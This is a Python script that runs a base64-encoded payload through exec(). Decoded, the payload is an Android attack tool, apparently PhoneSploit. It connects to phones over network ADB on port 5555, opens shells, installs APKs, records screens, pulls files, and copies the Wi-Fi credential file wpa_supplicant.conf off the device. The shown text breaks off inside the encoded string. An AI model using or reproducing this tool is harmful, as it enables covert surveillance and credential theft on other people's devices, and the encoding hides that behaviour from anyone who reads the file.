import marshal, base64
exec(base64.b64decode("CgojLSotIGNvZGluZzogdXRmLTggLSotCgojQ29kZWQgQnkgU2h1QmhhbWcwc2FpbgojIEVuam95CgoKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiNJbXBvcnRzCmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCByYW5kb20KaW1wb3J0IHRpbWUgYXMgIHQKZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgaW5pdAoKcmVsb2FkKHN5cykKc3lzLnNldGRlZmF1bHRlbmNvZGluZygidXRmLTgiKQoKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgVmFyaWFibGVzCkN1cnJlbnREaXIgPSBvcy5wYXRoLmRpcm5hbWUob3MucGF0aC5hYnNwYXRoKF9fZmlsZV9fKSkKbG9hZF9jb3VudCA9IDAKcGFnZTIgPSBGYWxzZQoKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiNJbnN0YWxsIEZ1bmN0aW9ucwojIGRlZiBDb2xvcmluZ01vZGVTdGFydHVwKCk6CiMgICAgIGNvbG9yaW5nX2ZpbGUgPSBvcGVuKEN1cnJlbnREaXIrIlxcaW5zdGFsbFxcY29sb3JpbmcudHh0IiwgImErIikKIyAgICAgbGluZSA9IG9wZW4oQ3VycmVudERpcisiXFxpbnN0YWxsXFxjb2xvcmluZy50eHQiLCAiYSsiKS5yZWFkbGluZSgpCiMgICAgIGlmICdpbml0JyBpbiBsaW5lOgojICAgICAgICAgaW5pdChjb252ZXJ0PVRydWUpCiMgICAgICAgICBtYWluKCkKIyAgICAgaWYgJ2ZhbHNlJyBpbiBsaW5lOgojICAgICAgICAgbWFpbigpCiMgICAgIGlmICJOT1RfTE9BREVEIiBpbiBsaW5lOgojICAgICAgICAgcGxhdGZvcm1fY2hvaWNlID0gcmF3X2lucHV0KCJBcmUgeW91IGxvYWRpbmcgdGhpcyBzY3JpcHQgaW4gKFcpaW5kb3dzIG9yIChMKWludXg6ICIpCiMgICAgICAgICBvcGVuKEN1cnJlbnREaXIrIlxcaW5zdGFsbFxcY29sb3JpbmcudHh0IiwgInciKS5jbG9zZSgpCiMgICAgICAgICBpZiBwbGF0Zm9ybV9jaG9pY2UubG93ZXIoKSA9PSAndyc6CiMgICAgICAgICAgICAgY29sb3JpbmdfZmlsZS53cml0ZSgiaW5pdCIpCiMgICAgICAgICBlbHNlOgojICAgICAgICAgICAgIGNvbG9yaW5nX2ZpbGUud3JpdGUoImZhbHNlIikKIyAgICAgICAgICAgICB5biA9IHJhd19pbnB1dChGb3JlLldISVRFICsgIkhhdmUgeW91IGFscmVhZHkgaW5zdGFsbGVkIGFkYiB2aWEgY29tbWFuZCBsaW5lICIrRm9yZS5HUkVFTiArICJZIitGb3JlLldISVRFKyIvIitGb3JlLlJFRCsiTiAiK0ZvcmUuV0hJVEUpCiMgICAgICAgICAgICAgaWYgeW4gPT0gIm4iOgojICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oInN1ZG8gYXB0IGluc3RhbGwgYWRiIikKIyAgICAgICAgICAgICBlbHNlOgojICAgICAgICAgICAgICAgICBtYWluKCkKCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojIEdyYXBoaWNzICMgaHR0cDovL3BhdG9yamsuY29tL3NvZnR3YXJlL3RhYWcvI3A9ZGlzcGxheSZmPUdyYWZmaXRpJnQ9VHlwZSUyMFNvbWV0aGluZyUyMAoKYXJyb3cgPSBGb3JlLlJFRCArICIgIOKUlOKUgOKUgD4iLmRlY29kZSgidXRmLTgiKS5zdHJpcCgpICsgRm9yZS5XSElURQphcnJvdyA9IHN0cihhcnJvdykKY29ubmVjdCA9IEZvcmUuUkVEICsgIuKUgiIuZGVjb2RlKCJ1dGYtOCIpLnN0cmlwKCkgKyBGb3JlLldISVRFCgpsb2dvX2Rlc2lnbl8xID0gKCcnJwogIHswfSAgX19fXyAgX18gICAgICAgICAgICAgICAKICAgLyBfXyBcLyAvXyAgX19fXyAgX19fXyAgX19fIAogIC8gL18vIC8gX18gXC8gX18gXC8gX18gXC8gXyBcCnsxfSAvIF9fX18vIC8gLyAvIC9fLyAvIC8gLyAvICAKL18vICAgL18vIC9fL1xfX19fL18vIC9fL1xfX18vCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLycnJykuZm9ybWF0KEZvcmUuR1JFRU4sIEZvcmUuV0hJVEUsIEZvcmUuUkVEKQoKbG9nb19kZXNpZ25fMiA9IEZvcmUuR1JFRU4gKyAnJycgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAuOycgICAgICAgICAgICAgICAgICAgICBgOywKIC47JyAgLDsnICAgICAgICAgICAgIGA7LCAgYDssICAgezB9UGhvbmUKLjsnICAsOycgICw7JyAgICAgYDssICBgOywgIGA7LAo6OiAgIDo6ICAgOiAgIHsxfSggKXswfSAgIDogICA6OiAgIDo6ICB7MX1Db2RlZCBieSBTaHVCaGFtZzBzYWluIC8gTWV0YWNoYXJ7MH0KJzouICAnOi4gICc6LiB7MX0vX1x7MH0gLDonICAsOicgICw6JwogJzouICAnOi4gICAgezF9L19fX1x7MH0gICAgLDonICAsOicgICAKICAnOi4gICAgICAgezF9L19fX19fXHswfSAgICAgICw6JwogICAgICAgICAgIHsxfS8gICAgICAgXFx7MH0KJycnLmZvcm1hdChGb3JlLkdSRUVOLCBGb3JlLldISVRFLCBGb3JlLlJFRCkKCmxvZ29fZGVzaWduX3ByZSA9ICcnJwp7MH3ilZTilZDilZd7MX3ilKwg4pSs4pSM4pSA4pSQ4pSM4pSQ4pSM4pSM4pSA4pSQCnswfeKVoOKVkOKVnXsxfeKUnOKUgOKUpOKUgiDilILilILilILilILilJzilKQgIAp7MH3ilakgIHsxfeKUtCDilLTilJTilIDilJjilJjilJTilJjilJTilIDilJggJycnLmZvcm1hdChGb3JlLkdSRUVOLCBGb3JlLldISVRFLCBGb3JlLlJFRCkKbG9nb19kZXNpZ25fMyA9IGxvZ29fZGVzaWduX3ByZS5kZWNvZGUoInV0Zi04IikKCmxvZ29fZGVzaWduXzQgPSAnJycKXDAzM1s5Mm0KICAgICAgICAgICtoeWROTk5OZHloKwogICAgICAgICttTU1NTU1NTU1NTU1NbSsKICAgICAgYGRNTW1cMDMzWzBtOlwwMzNbOTJtTk1NTU1NTU5cMDMzWzBtOlwwMzNbOTJtbU1NZGAKICAgICAgaE1NTU1NTU1NTU1NTU1NTU1NTWgKICBcMDMzWzkybS4uICB5eXl5eXl5eXl5eXl5eXl5eXl5eSAgLi4gICAgICAgICAgICAgIFwwMzNbMG0gRXhwbG9pdCB0aW1lIDopIFwwMzNbOTJtClwwMzNbOTJtLm1NTW1gTU1NTU1NTU1NTU1NTU1NTU1NTU1gbU1NbS4gICAgICAgICAgICBcMDMzWzBtIFRoYW5rcyBmb3IgZG93bmxvYWRpbmchXDAzM1s5Mm0KXDAzM1s5Mm06TU1NTS1NTU1NTU1NTU1NTU1NTU1NTU1NTS1NTU1NOgo6TU1NTS1NTU1NTU1NTU1NTU1NTU1NTU1NTS1NTU1NOgo6TU1NTS1NTU1NTU1NTU1NTU1NTU1NTU1NTS1NTU1NOgo6TU1NTS1NTU1NTU1NTU1NTU1NTU1NTU1NTS1NTU1NOgotTU1NTS1NTU1NTU1NTU1NTU1NTU1NTU1NTS1NTU1NLQogK3l5KyBNTU1NTU1NTU1NTU1NTU1NTU1NTSAreXkrCiAgICAgIG1NTU1NTU1NTU1NTU1NTU1NTU1tCiAgICAgIGAvKytNTU1NaCsraE1NTU0rKy9gCiAgICAgICAgICBNTU1NbyAgb01NTU0KICAgICAgICAgIE1NTU1vICBvTU1NTQogICAgICAgICAgb05NbS0gIC1tTU5zJycnCgpwYWdlXzEgPSAnJydcbgp7MH1bezF9MXswfV0gezJ9U2hvdyBDb25uZWN0ZWQgRGV2aWNlcyAgICAgIHswfVt7MX02ezB9XSB7Mn1TY3JlZW4gcmVjb3JkIGEgcGhvbmUgICAgICAgICAgICAgICB7MH1bezF9MTF7MH1dIHsyfVVuaW5zdGFsbCBhbiBhcHAgICAgICAgICAgICAgICAgICAgCnswfVt7MX0yezB9XSB7Mn1EaXNjb25lY3QgYWxsIGRldmljZXMgICAgICAgezB9W3sxfTd7MH1dIHsyfVNjcmVlbiBTaG90IGEgcGljdHVyZSBvbiBhIHBob25lICAgIHswfVt7MX0xMnswfV0gezJ9U2hvdyByZWFsIHRpbWUgbG9nIG9mIGRldmljZSAgICAgICAKezB9W3sxfTN7MH1dIHsyfUNvbm5lY3QgYSBuZXcgcGhvbmUgICAgICAgICB7MH1bezF9OHswfV0gezJ9UmVzdGFydCBTZXJ2ZXIgICAgICAgICAgICAgICAgICAgICAgezB9W3sxfTEzezB9XSB7Mn1EdW1wIFN5c3RlbSBJbmZvICAgICAgICAgICAgICAgICAgIAp7MH1bezF9NHswfV0gezJ9QWNjZXNzIFNoZWxsIG9uIGEgcGhvbmUgICAgIHswfVt7MX05ezB9XSB7Mn1QdWxsIGZvbGRlcnMgZnJvbSBwaG9uZSB0byBwYyAgICAgICB7MH1bezF9MTR7MH1dIHsyfUxpc3QgYWxsIGFwcHMgb24gYSBwaG9uZSAgICAgICAgICAgCnswfVt7MX01ezB9XSB7Mn1JbnN0YWxsIGFuIGFwayBvbiBhIHBob25lICAgezB9W3sxfTEwezB9XSB7Mn1UdXJuIFRoZSBEZXZpY2Ugb2ZmICAgICAgICAgICAgICAgIHswfVt7MX0xNXswfV0gezJ9UnVuIGFuIGFwcCAgICAgICAgICAgICAgICAgICAgICAgICAKCgp7MH1bezF9OTl7MH1dIHsyfUV4aXQgICB7MH1bezF9MHswfV0gezJ9Q2xlYXIgICB7MH1bezF9cHswfV0gTmV4dCBQYWdlICAgICAgICAgICAgICAgICAgICAgICAgICAgdjEuMgonJycuZm9ybWF0KEZvcmUuQ1lBTiwgRm9yZS5SRUQsIEZvcmUuR1JFRU4pCgpwYWdlXzIgPSAnJydcbgp7MH1bezF9MTZ7MH1dezJ9IFBvcnQgRm9yd2FyZGluZyAgICAgICAgICAgICAgICB7MH1bezF9MjF7MH1dezJ9IE5ldFN0YXQgCnswfVt7MX0xN3swfV17Mn0gR3JhYiB3cGFfc3VwcGxpY2FudCAgICAgICAgICAgIHswfVt7MX0yMnswfV17Mn0gVHVybiBXaUZpIE9uL09mZiAgICAgICAgICAgICAgICAgCnswfVt7MX0xOHswfV17Mn0gU2hvdyBNYWMvSW5ldCAgICAgICAgICAgICAgICAgIHswfVt7MX0yM3swfV17Mn0gUmVtb3ZlIFBhc3N3b3JkCnswfVt7MX0xOXswfV17Mn0gRXh0cmFjdCBhcGsgZnJvbSBhcHAgICAgICAgICAgIHswfVt7MX0yNHswfV17Mn0gVXNlIEtleWNvZGUgICAgICAgICAgICAKezB9W3sxfTIwezB9XXsyfSBHZXQgQmF0dGVyeSBTdGF0dXMgICAgICAgICAgICAgezB9W3sxfTI1ezB9XXsyfSBHZXQgQ3VycmVudCBBY3Rpdml0eSAgICAgICAgICAgICAgICAgIAoKCnswfVt7MX05OXswfV0gezJ9RXhpdCAgIHswfVt7MX0wezB9XSB7Mn1DbGVhciAgIHswfVt7MX1iezB9XSBCYWNrIHRvIHBhZ2Ugb25lCicnJy5mb3JtYXQoRm9yZS5DWUFOLCBGb3JlLlJFRCwgRm9yZS5HUkVFTikKCgojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KI01haW4KZGVmIG1haW4oKToKICAgIHBhZ2VfbnVtID0gMQogICAgb3Muc3lzdGVtKCJhZGIgdGNwaXAgNTU1NSIpCiAgICBvcy5zeXN0ZW0oImFkYiBkZXZpY2VzIC1sIikKICAgIHByaW50ICgoIlxuW3swfSt7MX1dIEVudGVyIGEgcGhvbmVzIGlwIGFkZHJlc3MuKFR5cGUgOTkgdG8gZXhpdCkiKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgdHJ5OgogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0IChhcnJvdysiIHBob25lIitGb3JlLlJFRCArICIoY29ubmVjdF9waG9uZSkgIitGb3JlLldISVRFICsgIj4gIikKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBtYWluKCkKICAgIGlmIGRldmljZV9uYW1lID09ICcnOgogICAgICAgIG1haW4oKQogICAgaWYgZGV2aWNlX25hbWUgPT0gJzk5JzoKICAgICAgICBleGl0KCkKICAgIG9zLnN5c3RlbSgiYWRiIGNvbm5lY3QgIitkZXZpY2VfbmFtZSsiOjU1NTUiKQogICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgd2hpbGUoMSk6CiAgICAgICAgaWYgb3B0aW9uID09ICcxJzoKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgZGV2aWNlcyAtbCIpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lIitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiAgPT0gICcyJzoKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgZGlzY29ubmVjdCIpCiAgICAgICAgICAgIG1haW4oKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMyc6CiAgICAgICAgICAgIG1haW4oKQoKICAgICAgICBlbGlmIG9wdGlvbiAgPT0gJzQnOgogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwiKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZSIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzUnOgogICAgICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciB0aGUgYXBrIGxvY2F0aW9uLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIGFwa19sb2NhdGlvbiA9IHJhd19pbnB1dCgiICAgICIrYXJyb3cgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihhcGtfaW5zdGFsbCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgICIrZGV2aWNlX25hbWUrIiBpbnN0YWxsICIrYXBrX2xvY2F0aW9uKQogICAgICAgICAgICBwcmludCAoRm9yZS5HUkVFTiAgKyAgIkFwayBoYXMgYmVlbiBpbnN0YWxsZWQuIikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICAnNic6CiAgICAgICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XSBQbGVhc2Ugd2FpdCAzbSBpdHMgcmVjb3JkaW5nIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwgc2NyZWVucmVjb3JkIC9zZGNhcmQvZGVtby5tcDQiKQogICAgICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgd2hlcmUgeW91IHdvdWxkIGxpa2UgdGhlIHZpZGVvIHRvIGJlIHNhdmVkLltEZWZhdWx0OiBwcmVzZW50IHdvcmtpbmcgZGlyZWN0b3J5XSIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIHBsYWNlX2xvY2F0aW9uID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZSIrRm9yZS5SRUQgKyAiKHNjcmVlbl9yZWNvcmQpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBwdWxsIC9zZGNhcmQvZGVtby5tcDQgIitwbGFjZV9sb2NhdGlvbikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uICA9PSAnNyc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBzY3JlZW5jYXAgL3NkY2FyZC9zY3JlZW4ucG5nIikKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgd2hlcmUgeW91IHdvdWxkIGxpa2UgdGhlIHNjcmVlbnNob3QgdG8gYmUgc2F2ZWQuW0RlZmF1bHQ6IHByZXNlbnQgd29ya2luZyBkaXJlY3RvcnldIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgcGxhY2VfbG9jYXRpb24gPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lIitGb3JlLlJFRCArICIoc2NyZWVuc2hvdCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHB1bGwgL3NkY2FyZC9zY3JlZW4ucG5nICIrcGxhY2VfbG9jYXRpb24pCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lIitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnOCc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIGtpbGwtc2VydmVyICYmIGFkYiBzdGFydC1zZXJ2ZXIiKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZSIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzknOgogICAgICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciBhIGZpbGUgbG9jYXRpb24gb24gYSBkZXZpY2UiKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBmaWxlX2xvY2F0aW9uID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZSIrRm9yZS5SRUQgKyAiKGZpbGVfcHVsbCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAgICAiK2Nvbm5lY3QpKQogICAgICAgICAgICBwcmludCAoKCIgICAgICAgW3swfSt7MX1dRW50ZXIgd2hlcmUgeW91IHdvdWxkIGxpa2UgdGhlIGZpbGUgdG8gYmUgc2F2ZWQuW0RlZmF1bHQ6IHByZXNlbnQgd29ya2luZyBkaXJlY3RvcnldIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgcGxhY2VfbG9jYXRpb24gPSByYXdfaW5wdXQoIiAgICAgICAiK2Fycm93ICsgInBob25lIitGb3JlLlJFRCArICIoZmlsZV9wdWxsKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgcHVsbCAiK2ZpbGVfbG9jYXRpb24rIiAiK3BsYWNlX2xvY2F0aW9uKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZSIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzEwJzoKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsgIiByZWJvb3QgIikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICAnMTEnOgogICAgICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciBhIHBhY2thZ2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBwYWNrYWdlX25hbWUgPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lIitGb3JlLlJFRCArICIoYXBwX2RlbGV0ZSkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHVuaXN0YWxsICIrcGFja2FnZV9uYW1lKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZSIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzEyJzoKICAgICAgICAgICAgb3Muc3lzdGVtKCdhZGIgLXMgJytkZXZpY2VfbmFtZSsiIGxvZ2NhdCAiKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZSIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzEzJzoKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgIC1zICIrZGV2aWNlX25hbWUrIiBkdW1wc3lzIikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcxNCc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIgK2RldmljZV9uYW1lKyAiIHNoZWxsIHBtIGxpc3QgcGFja2FnZXMgLWYiKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZSIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzE1JzoKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgYSBwYWNrYWdlIG5hbWUuIFRoZXkgbG9vayBsaWtlIHRoaXMgLS0+IGNvbS5zbmFwY2hhdC5hbmRyb2lkIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgcGFja2FnZV9uYW1lID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZSIrRm9yZS5SRUQgKyAiKGFwcF9ydW4pICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBtb25rZXkgLXAgIitwYWNrYWdlX25hbWUrIiAtdiA1MDAiKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZSIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzE2JzoKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgYSBwb3J0IG9uIHRoZSBkZXZpY2UuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgcG9ydF9kZXZpY2UgPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lIitGb3JlLlJFRCArICIocG9ydF9mb3J3YXJkKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBwcmludCAoKCIgICAgICAgICAiK2Nvbm5lY3QpKQogICAgICAgICAgICBwcmludCAoKCIgICAgICAgIFt7MH0rezF9XUVudGVyIGEgcG9ydCB0byBmb3J3YXJkIGl0IHRvby4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBmb3J3YXJkX3BvcnQgPSByYXdfaW5wdXQoIiAgICAgICAgIithcnJvdyArICJwaG9uZSIrRm9yZS5SRUQgKyAiKHBvcnRfZm9yd2FyZCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIGZvcndhcmQgdGNwOiIrcG9ydF9kZXZpY2UrIiB0Y3A6Iitmb3J3YXJkX3BvcnQpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lIitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMTcnOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBwcmludCAoKEZvcmUuV0hJVEUgKyAiICAgIFt7MH0rezF9XXsxfVRIRSBERVZJQ0UgTkVFRFMgVE8gQkUgUk9PVEVEIFRPIENPTlRJTlVFIFRPIEVYSVQgVVNFIENUUkwgK0MiKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgICAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XUVudGVyIHdoZXJlIHlvdSB3YW50IHRoZSBmaWxlIHRvIGJlIHNhdmVkLltEZWZhdWx0OiBwcmVzZW50IHdvcmtpbmcgZGlyZWN0b3J5XSIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgICAgICBsb2NhdGlvbiA9IHJhd19pbnB1dCgiICAgICIrYXJyb3cgKyAicGhvbmUiK0ZvcmUuUkVEICsgIih3cGFfZ3JhYikgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCAiKyJzdSAtYyAnY3AgL2RhdGEvbWlzYy93aWZpL3dwYV9zdXBwbGljYW50LmNvbmYgL3NkY2FyZC8nIikKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBwdWxsIC9zZGNhcmQvd3BhX3N1cHBsaWNhbnQuY29uZiAiK2xvY2F0aW9uKQogICAgICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZSIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzE4JzoKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIiArZGV2aWNlX25hbWUrICIgc2hlbGwgaXAgYWRkcmVzcyBzaG93IHdsYW4wIikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcxOSc6CiAgICAgICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XUVudGVyIGEgcGFja2FnZSBuYW1lLiBUaGV5IGxvb2sgbGlrZSB0aGlzIC0tPiBjb20uc25hcGNoYXQuYW5kcm9pZCIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIHBhY2thZ2VfbmFtZSA9IHJhd19pbnB1dCgiICAgICIrYXJyb3cgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihwdWxsX2FwaykgIitGb3J